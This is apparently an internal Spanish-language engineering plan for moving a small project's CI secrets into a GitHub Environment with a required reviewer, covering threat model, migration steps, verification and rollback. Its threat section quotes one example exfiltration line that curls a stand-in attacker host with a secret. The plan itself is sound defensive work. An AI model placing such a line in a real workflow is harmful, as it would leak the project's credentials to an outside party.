# MIS-303 · B11 — GitHub Environment con revisor requerido para los secretos de CI

> Dividido de MIS-293 (Fase 3 — Higiene). **Alcance acotado (2026-08-16):** este ticket
> hace SOLO **B11**. El *deployment de Convex dedicado a CI* se separó a **MIS-305**.
> Plan de récord, **ronda 1**. **NO autoriza aplicar/mergear/desplegar** — ver "Gate".
> Es **infra de CI**: no toca `convex/` ni el frontend → **no hay deploy de Convex ni de Railway**.

## 0. Decisión consciente (abrir por aquí)

Un GitHub Environment con **revisor requerido** hace que el job que lo referencia quede
**en pausa hasta que un revisor lo apruebe** antes de ejecutarse (y de recibir los secretos).
Consecuencia aceptada al elegir este enfoque:

- **Cada corrida del job `e2e` se pausa esperando aprobación manual** — en cada PR *y* en cada
  push a `main` (el workflow dispara en ambos). Para un repo de un solo dev, es **un clic extra
  por PR y por merge**. Es el coste inherente de "revisor requerido"; no hay un toggle nativo de
  "revisor solo para PRs no confiables".
- Para que el propio owner pueda **aprobar sus propias corridas**, el Environment debe tener
  **`prevent_self_review = false`** (permitir auto-revisión). Así el owner (revisor) desbloquea sus
  runs; un autor de PR que **no** sea el owner no puede aprobar → queda gated.

**Esta es la decisión que el enfoque "Environment con revisor" (elegido por el usuario) ya asume.**
Si al auditar se juzga que la fricción por-merge en `main` no compensa, alternativa de menor fricción
descrita en §7 (no recomendada: complica el workflow).

## 1. Contexto (estado actual, verificado)

- **11 secretos, todos a nivel repo** (`gh secret list`): `AUTH_SERVER_KEY`, `E2E_CARLOS_EMAIL`,
  `E2E_CARLOS_PASSWORD`, `E2E_MARTA_EMAIL`, `E2E_MARTA_PASSWORD`, `E2E_TEST_SUPPORT_KEY`,
  `GOOGLE_CLIENT_ID`, `GOOGLE_CLIENT_SECRET`, `GOOGLE_LOGIN_SHARED_SECRET`, `GOOGLE_OAUTH_REDIRECT_URI`,
  `NEXT_PUBLIC_CONVEX_URL`.
- **Un solo workflow**: `.github/workflows/ci.yml`, dos jobs:
  - `build` (`npm ci` + `lint` + `build`): **no consume ningún secreto** (sin bloque `env`).
  - `e2e` (`needs: build`): consume **los 11** (10 en el paso `npm run test:e2e` + `NEXT_PUBLIC_CONVEX_URL`
    también en el paso `test:e2e:secret-gate`).
- Ya existe **un** Environment: `observant-vitality / production` (creado por la integración de Railway,
  sin `protection_rules`). Es un destino de despliegue de Railway; **no** consume estos secretos de GitHub.
- **Todos los 11 valores son reconstruibles desde ficheros locales** (nombres verificados, valores nunca leídos/impresos):
  - `.env.local` → `NEXT_PUBLIC_CONVEX_URL`, `GOOGLE_CLIENT_ID`, `GOOGLE_CLIENT_SECRET`,
    `GOOGLE_OAUTH_REDIRECT_URI`, `GOOGLE_LOGIN_SHARED_SECRET`, `AUTH_SERVER_KEY` (6).
  - `.env.test.local` → `E2E_CARLOS_EMAIL`, `E2E_CARLOS_PASSWORD`, `E2E_MARTA_EMAIL`,
    `E2E_MARTA_PASSWORD`, `E2E_TEST_SUPPORT_KEY` (5).
  - `AUTH_SERVER_KEY` aparece en ambos ficheros: **deben ser idénticos** (los dos deben coincidir con el
    del deployment de Convex de dev). Pre-check en §3.2.
- `gh` autenticado como `mistumonso-cloud`, scopes incluyen `repo` y `workflow` → puedo crear el
  Environment y gestionar secretos por API.

## 2. Amenaza y qué la corrige

**Hoy:** los secretos a nivel repo están disponibles para **cualquier job de un workflow disparado por un
PR del mismo repo**. Un PR que modifique `ci.yml` (p. ej. añadir `run: curl attacker.com -d "$AUTH_SERVER_KEY"`
en el job `build`, que hoy no gatea nada) los exfiltraría. (Matiz: los PR desde **forks** ya **no** reciben
secretos por defecto en GitHub; el riesgo residual real es una rama del mismo repo, un colaborador futuro,
o una edición maliciosa del workflow — defensa en profundidad, y es lo que pide B11.)

**Corrección (dos efectos combinados):**
1. **Mover los secretos a nivel Environment** → dejan de estar disponibles repo-wide; **solo** los ve un
   job que referencia ese Environment (el job `build`, u otro job inyectado por un PR, ya no puede leerlos).
2. **Revisor requerido** en el Environment → incluso el job `e2e` no arranca (ni recibe los secretos) hasta
   que el owner aprueba la corrida, tras ver de qué PR viene.

El **borrado de los secretos a nivel repo** es parte imprescindible del fix: si se quedaran a nivel repo,
seguirían siendo exfiltrables por un job no gateado.

## 3. Diseño

### 3.1 Crear el Environment `ci`
`PUT /repos/mistumonso-cloud/mi-crm/environments/ci` con:
- `reviewers: [{ type: "User", id: <id numérico del owner> }]` (id vía `gh api user -q .id` en el momento).
- `prevent_self_review: false` (el owner aprueba sus propias corridas — ver §0).
- `deployment_branch_policy: null` (sin restricción de ramas: las ramas de PR deben poder correr el e2e tras
  aprobación; el control es el revisor, no la rama).
- `wait_timer: 0`.
- `can_admins_bypass`: se deja el valor por defecto. Justificación: la amenaza es un **PR no confiable**, cuyo
  autor **no** es admin y por tanto **no** puede saltarse el gate; el admin (owner) es la parte confiable y
  además el revisor. (Se registra el valor efectivo en la evidencia.)

Nombre `ci` (no colisiona con `observant-vitality / production`).

### 3.2 Migrar los 11 secretos a nivel Environment (sin imprimir valores)
- **Pre-check de consistencia** (sin imprimir): comparar el valor de `AUTH_SERVER_KEY` en `.env.local` vs
  `.env.test.local` con `cmp` sobre extracciones piped; deben ser iguales. Si difieren → PARAR y preguntar
  (indicaría un desajuste con Convex dev). Se usará el de `.env.local`.
- **Parser dotenv seguro y fail-closed** (no `grep|cut`, que arrastra comillas literales, se rompe con espacios/`=`
  en el valor, CRLF o comentarios): usar `require("dotenv").parse(fs.readFileSync(<fichero>))` — el repo ya depende de
  `dotenv`. El extractor **debe fallar (exit ≠ 0)** si la clave **no existe** o su valor es **vacío** (`Object.hasOwn`
  + `value.length > 0`); **nunca** enviar un vacío silencioso (`?? ""` está prohibido). La tubería corre con
  `set -o pipefail` para que un fallo del extractor aborte el `gh secret set` en vez de fijar un secreto vacío. Un
  `node -e` extrae **un** valor y lo escribe por **stdout piped directamente al stdin de `gh secret set`**, de modo
  que el valor **nunca** aparece en la terminal (ni en argv/`--body`, ni en logs, ni `echo`):
  ```
  set -o pipefail
  node -e 'const fs=require("fs");const p=require("dotenv").parse(fs.readFileSync(process.argv[1]));const k=process.argv[2];if(!Object.hasOwn(p,k)||p[k].length===0){console.error("FALTA/VACIO: "+k);process.exit(1)}process.stdout.write(p[k])' <fichero> <NAME> \
    | gh secret set <NAME> --env ci
  ```
  Los 11, con su fichero de origen según §1 (`AUTH_SERVER_KEY` desde `.env.local`).

**GitHub secrets son de solo escritura**: no se puede leer el valor actual del secreto de GitHub para copiarlo — por
eso la fuente son los `.env` locales. Precedencia GitHub: **un secreto de Environment tiene prioridad sobre el de
repo del mismo nombre** para el job que referencia ese Environment → durante la migración el job `e2e` ya lee los del
Environment, con los de repo como red de seguridad hasta su borrado final.

**Qué demuestra (y qué NO) un CI verde** (corrige la afirmación de la ronda 1): un CI verde valida **el conjunto de
caminos ejercitados por la suite**, no necesariamente los 11 valores. Cobertura real en §3.5. Lo que hace segura la
migración pese a ello: (a) el borrado de los secretos de repo ocurre **después del merge y de un verde post-merge**
(§3.4), y (b) **GitHub nunca fue la fuente de verdad** — cada valor es recuperable de su fuente autoritativa (§3.5),
así que borrar la copia de repo no puede perder "el único valor conocido".

### 3.3 `.github/workflows/ci.yml` — cambios en el repo
- Añadir `environment: ci` al job **`e2e`** (una línea + comentario B11). El paso `test:e2e:secret-gate` y el
  `upload-artifact` viven dentro de ese mismo job → quedan cubiertos.
- Añadir `workflow_dispatch:` a los triggers `on:` — mecanismo definido para la **corrida NUEVA post-borrado** (M4,
  §3.4.11): `gh workflow run ci.yml --ref main` genera un run nuevo (run_id/created_at propios), no un re-run del
  anterior. Su job `e2e` referencia igualmente el Environment → también pasa por `Waiting`→aprobación.
- El job **`build` NO cambia** (no usa secretos; no debe gatearse ni ralentizar el pipeline con una aprobación).
- No se tocan los bloques `env:` (siguen referenciando `${{ secrets.NAME }}`; ahora resuelven al secreto de
  Environment).

### 3.4 Orden canónico único de ejecución (M1 + M2)

**Esta es la ÚNICA secuencia; §6 la referencia sin re-ordenar.** El Environment se crea, protege y puebla **antes**
del PR (M1); los secretos de repo se borran **solo después del merge y de un verde post-merge en `main`** (M2). Hay
una breve fase de **duplicación** (Environment + repo a la vez), pero **nunca** una fase de rotura.

1. **Auditoría de código** (GO) del `codigo-completo.md` de `CODIGO/MIS-303-b11-environment/`.
2. **Permiso explícito** del usuario para las operaciones sobre GitHub.
3. **Crear Environment `ci`** (§3.1): reviewer = owner, `prevent_self_review:false`. **Verificar por API** que la
   regla `required_reviewers` aparece **efectiva** en la respuesta (`gh api …/environments/ci`) **y que el `id` del
   reviewer corresponde al login esperado `mistumonso-cloud`** (no solo "el usuario autenticado"; resolver login→id
   con `gh api users/mistumonso-cloud -q .id` y comparar). **Si la regla no aparece** — por plan del repo,
   visibilidad o permisos del token — **PARAR antes de seguir** (no publicar el workflow sin el gate).
4. **Gate M3 — validación de los 4 valores no cubiertos funcionalmente** (`GOOGLE_CLIENT_ID`,
   `GOOGLE_OAUTH_REDIRECT_URI`, `GOOGLE_CLIENT_SECRET`, `GOOGLE_LOGIN_SHARED_SECRET`): **antes** de cargar nada, el
   usuario **confirma explícitamente** que `.env.local` contiene sus valores vigentes, **o** se contrastan sin
   mostrarlos contra su fuente autoritativa (Google Cloud Console / env de Convex dev, §3.5). **Sin esta confirmación
   no se cargan los secretos.** (Los 7 funcionales no necesitan este gate: un valor erróneo los pondría en rojo.)
5. **Cargar los 11 secretos a nivel Environment** (§3.2): extractor **fail-closed** (aborta si clave ausente/vacía,
   `pipefail`), pre-check de `AUTH_SERVER_KEY`. Registrar **solo nombres + fichero de origen + timestamp** (nunca
   valores ni hashes). Los secretos de repo **se quedan** (red de seguridad).
6. **Rama + PR** con el cambio de `ci.yml` (§3.3). **Permiso antes del push.**
7. Corrida del PR: **confirmar que el job `e2e` entra en `Waiting`** (gate vivo) → **aprobar** → **verde** (lee los
   secretos de Environment por precedencia; los de repo siguen ahí).
8. **Merge (asistente, con permiso)** — **con los secretos de repo TODAVÍA presentes**, para no romper el workflow
   que `main` tendrá tras el merge.
9. Corrida **post-merge en `main`**: confirmar `Waiting` → **aprobar** → **verde** (workflow nuevo ya en `main`,
   secretos de repo aún presentes).
10. **Borrar los 11 secretos de repo** (`gh secret delete <NAME>`, sin `--env`), habiendo registrado antes la lista
    de nombres + timestamp.
11. **M4 — corrida NUEVA post-borrado** (no un re-run del run anterior, que podría conservar contexto del intento
    previo): `gh workflow run ci.yml --ref main` (workflow_dispatch, §3.3). **Registrar `run_id` y `created_at` del
    run nuevo y comprobar que son posteriores al borrado** (paso 10). Confirmar en ESE run: `Waiting` → aprobar →
    **verde usando SOLO los secretos de Environment** (prueba final e inequívoca del aislamiento).
12. **Verificaciones de aislamiento estructural** (§4): `build` no referencia el Environment, los secretos de repo
    están ausentes, y el Environment no entrega sus secretos a `build`; `e2e` permanece en `Waiting` hasta aprobación.
13. **Cerrar MIS-303**.

### 3.5 Matriz de validación de los 11 valores (M3)

Cobertura real de la suite (de `e2e/google-auth.spec.ts`: `/start` **no** asevera `client_id` ni `redirect_uri`;
todos los `/callback` **rechazan antes de contactar con Google**):

| Secreto | Cobertura CI | Fuente autoritativa (recuperable si se borra la copia de repo) |
|---|---|---|
| `NEXT_PUBLIC_CONVEX_URL` | **Funcional** (valor erróneo → toda la suite autenticada falla) | URL del deployment de Convex dev (`npx convex` / dashboard; público) |
| `AUTH_SERVER_KEY` | **Funcional** (login por password de carlos/marta + reset) | env var de Convex dev + `.env.local` (rotable con `convex env set`) |
| `E2E_CARLOS_EMAIL` | **Funcional** (login de carlos) | usuario sembrado en Convex dev |
| `E2E_CARLOS_PASSWORD` | **Funcional** (login de carlos) | password del usuario sembrado; recuperable re-sembrando (`hash-password` + `auth:seedUser`) |
| `E2E_MARTA_EMAIL` | **Funcional** (login de marta) | usuario sembrado en Convex dev |
| `E2E_MARTA_PASSWORD` | **Funcional** (login de marta) | password del usuario sembrado; recuperable re-sembrando |
| `E2E_TEST_SUPPORT_KEY` | **Funcional** (specs de test-support/reset, `assertTestKey`) | env var de Convex dev + `.env.test.local` (rotable) |
| `GOOGLE_CLIENT_ID` | **Solo presencia** (se usa para construir la URL de `/start`, valor no aseverado) | Google Cloud Console (no confidencial) |
| `GOOGLE_OAUTH_REDIRECT_URI` | **Solo presencia** (idem) | Google Cloud Console (no confidencial) |
| `GOOGLE_CLIENT_SECRET` | **No ejercitado** (solo el intercambio real de código lo usa) | Google Cloud Console (rotable) |
| `GOOGLE_LOGIN_SHARED_SECRET` | **No ejercitado** (solo tras un login de Google exitoso) | env var de Convex dev + `.env.local` (rotable) |

**Consecuencia y mitigación:** para los 4 no validados funcionalmente (2 presencia + 2 no ejercitados), un CI verde
**no** prueba su corrección. Mitigación: (a) **ninguno** se pierde al borrar la copia de repo — todos tienen fuente
autoritativa externa recuperable (columna 3), y los 3 de Google además **no son confidenciales de alto valor**
(`client_id`/`redirect_uri` son públicos; el `client_secret` es rotable en Google Console); (b) se pide **aceptación
explícita del usuario** de que `.env.local` es la copia vigente de esos 4 (es el fichero que alimenta su `npm run dev`
diario, así que lo mantiene al día). No se borran los secretos de repo hasta después del merge + verde post-merge, de
modo que cualquier fallo funcional aparecería antes en un camino ejercitado.

## 4. Verificación

**No hay spec automatizable del gate de revisor** (es config de GitHub, no código). La evidencia es de configuración
+ una corrida real:

- `gh api repos/mistumonso-cloud/mi-crm/environments/ci` → **la regla `required_reviewers` aparece efectiva** (M1
  §3.4.3: si no apareciera, se PARÓ antes del push) con `reviewers` = el owner **cuyo `id` resuelve al login
  `mistumonso-cloud`** y `prevent_self_review: false`; registrar el `can_admins_bypass` efectivo.
- `gh secret list --env ci` → los **11 nombres** a nivel Environment (§3.4.5). **"11 nombres presentes" ≠ "11 valores
  funcionalmente validados"**: lo primero se ve aquí; lo segundo es la cobertura de §3.5 (7/11) + el gate M3 (§3.4.4).
- `gh secret list` (repo) → los 11 **ausentes** (tras el borrado, §3.4.10).
- **Corrida del PR (§3.4.7)**: log/enlace mostrando el job `e2e` **en pausa "Waiting"** → **verde tras aprobar**
  (gate vivo + auto-aprobación del owner con `prevent_self_review:false`).
- **Corrida NUEVA post-borrado (§3.4.11)**: `run_id`/`created_at` **posteriores** al borrado (paso 10), `Waiting` →
  aprobar → **verde usando SOLO los secretos de Environment**.
- **Aislamiento de `build` (evidencia ESTRUCTURAL, no "quedó verde por sí solo"):** (a) el job `build` **no**
  referencia `environment: ci` en `ci.yml`; (b) los secretos de repo están **ausentes** (bullet anterior); (c) por el
  modelo de GitHub, un Environment **solo** entrega sus secretos a jobs que lo referencian → `build` no los recibe.
  El que `build` siga verde es consistente pero **no** es la prueba; la prueba es (a)+(b)+(c). El `e2e` **permanece en
  `Waiting`** hasta la aprobación (no arranca ni recibe secretos antes).
- **Registro de operaciones** (nunca valores ni hashes): **timestamp + nombres** de creación del Environment, carga,
  borrado y corrida final.
- **Cobertura de valores (§3.5):** 7/11 validados funcionalmente por la suite; 2 solo presencia; 2 no ejercitados —
  cubiertos por el gate M3 (§3.4.4) + fuente autoritativa recuperable. Un CI verde **no** prueba los 11 valores.
- `diff -u` de `ci.yml` (`environment: ci` en el job `e2e` + `workflow_dispatch:` en `on:`, con sus comentarios).

**Suite e2e**: corre en CI como siempre (misma suite, mismo deployment de dev; los datos de test NO cambian — eso
es MIS-305). Sin `lint`/`build`/`convex`/frontend tocados, no hay verificación local nueva que ejercite código.

## 5. Despliegue

**No toca `convex/` ni el frontend.** No hay `npx convex deploy` ni auto-deploy de Railway. El "despliegue" de
este ticket **es la propia configuración de GitHub** (crear el Environment, migrar y borrar secretos), que ejecuto
por `gh` **con permiso explícito** y con el orden seguro de §3.4. Sin smokes de prod (nada cambia en producción).

## 6. Gate (metodología estricta)

Este plan **NO** autoriza aplicar/mergear. Fases:

1. **Auditoría de plan** (GO/NO-GO; un GO CONDICIONADO también es GO).
2. **Código** effort **high** (solo `ci.yml`) → entrega autocontenida en
   `CODIGO/MIS-303-b11-environment/codigo-completo.md`: diff `diff -u` literal de `ci.yml`, contenido íntegro del
   `ci.yml` resultante, manifiesto `find … | sort`, y el **runbook literal de operaciones `gh`** (crear Environment,
   verificar la regla por API, migrar y —tras el merge— borrar secretos) con su salida de evidencia; el auditor solo
   ve ese texto.
3. **Auditoría de código externa** (GO/NO-GO).
4. **Ejecución: exactamente el orden canónico de §3.4** (pasos 2→12), sin re-ordenar. En particular: crear+proteger+
   poblar el Environment **antes** del PR (M1), y borrar los secretos de repo **solo tras el merge + verde post-merge**
   (M2). El cierre de MIS-303 es el paso 12 (comentario de cierre + PR enlazado).

## 7. Riesgos y rollback

- **Un valor migrado no coincide** → si es de los 7 funcionales, el `e2e` gateado sale **rojo** en un camino
  ejercitado (§3.4.7 en el PR, o §3.4.9 post-merge) **antes** del borrado de los secretos de repo (§3.4.10). Si es de
  los 4 no ejercitados, lo cubre el **gate M3 (§3.4.4)** antes de cargar. Ventana segura: se corrige el secreto de
  Environment y se reintenta; los de repo siguen de red hasta el verde post-merge.
- **Rollback según el estado:**
  - **Antes del borrado (§3.4.10):** quitar `environment: ci` de `ci.yml` restaura el comportamiento previo — los
    secretos de repo siguen presentes y el `e2e` vuelve a leerlos. Trivial.
  - **Después del borrado:** ya **no** basta con quitar `environment: ci`; hay que **restaurar primero los 11
    secretos de repo** (re-subirlos desde los `.env` locales / fuentes autoritativas de §3.5) y **luego** quitar la
    referencia al Environment. El borrado es reversible, pero el orden importa.
- **Fricción por aprobación** (§0): si molesta en `main`, alternativa de menor fricción = gatear el `e2e` **solo** en
  `pull_request` (separando la ruta de `push:main`), a coste de más complejidad en el workflow. **No recomendada**
  para esta ronda; follow-up si la fricción resulta molesta en la práctica.
- **`can_admins_bypass`** (§3.1): si en el futuro entra un **colaborador con rol admin**, podría saltarse el gate
  mientras `can_admins_bypass` siga habilitado (un admin ya puede además editar la config). Coherente con el threat
  model actual (single-owner), pero a revisar si cambia el modelo de equipo (endurecer → follow-up §8).
- **Clasificación de "secreto" vs config pública:** `NEXT_PUBLIC_CONVEX_URL`, `GOOGLE_CLIENT_ID` y
  `GOOGLE_OAUTH_REDIRECT_URI` **no son confidenciales** (el primero se inlina en el bundle; los dos de Google son
  públicos por diseño OAuth). Mantenerlos en el mismo Environment simplifica el contrato del job, pero su exposición
  no es el riesgo que B11 mitiga.

## 8. Follow-ups (fuera de alcance de MIS-303)
- **MIS-305** — deployment de Convex dedicado a CI (reutilizará este Environment `ci` para alojar la deploy key).
- Separar workflows `pull_request`/`push` para reducir aprobaciones en `main` (ver §0/§7).
- Rotación periódica de los secretos de CI.
- Segundo revisor requerido si el modelo pasa de single-owner a equipo.
- Endurecer `can_admins_bypass` si entra un colaborador admin (ver §7).
- Clasificar formalmente "secreto real" vs "config pública" y no tratarlos igual (ver §7).
